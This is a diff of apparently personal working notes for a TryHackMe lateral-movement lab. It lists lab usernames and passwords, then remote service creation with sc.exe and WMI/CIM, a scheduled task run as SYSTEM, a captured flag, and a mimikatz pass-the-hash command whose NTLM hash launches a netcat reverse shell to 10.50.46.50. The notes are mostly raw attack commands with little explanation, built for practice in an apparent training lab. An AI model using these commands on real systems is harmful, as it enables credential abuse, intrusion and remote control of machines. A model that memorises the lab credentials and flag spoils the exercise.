@@ -45,9 +45,9 @@
 
 
 # Lateral Movement
-arthur.campbell:Pksp9395
+tony.holland:Mhvn2334
 
-$ ssh za.tryhackme.com\\arthur.campbell:@thmjmp2.za.tryhackme.com
+$ ssh za.tryhackme.com\\tony.holland@thmjmp2.za.tryhackme.com
 
 
 sc.exe \\thmiis.za.tryhackme.com create THMservice-3244 binPath= "%windir%\pat.exe" start=auto
@@ -66,3 +66,29 @@ $securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
 $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
 
 Enter-PSSession -Computername \\thmiis.za.tryhackme.com -Credential $credentialwho
+
+#########
+User: ZA.TRYHACKME.COM\t1_corine.waters
+
+Password: Korine.1994
+
+Invoke-CimMethod -CimSession $Session -ClassName Win32_Service -MethodName Create -Arguments @{Name = "pat";DisplayName = "pat";PathName = "%windir%\pat.msi";ServiceType = [byte]::Parse("16");StartMode = "Manual"}
+
+$Service = Get-CimInstance -CimSession $Session -ClassName Win32_Service -filter "Name LIKE 'pat'"
+
+
+$Command = "cmd.exe"
+$Args = "%windir%\pat.msi"
+
+$Action = New-ScheduledTaskAction -CimSession $Session -Execute $Command -Argument $Args Register-ScheduledTask -CimSession $Session -Action $Action -User "NT AUTHORITY\SYSTEM" -TaskName "pat2" Start-ScheduledTask -CimSession $Session -TaskName "pat2"
+
+
+THM{MOVING_WITH_WMI_4_FUN}
+
+
+##########
+
+
+sekurlsa::pth /user:t1_toby.beck /domain:za.tryhackme.com /ntlm:f461626e5bfb1c0e98e80a30630aefb2 /run:"c:\tools\nc64.exe -e cmd.exe 10.50.46.50 5555"
+
+t1_toby.beck5\desktop\flag.exe
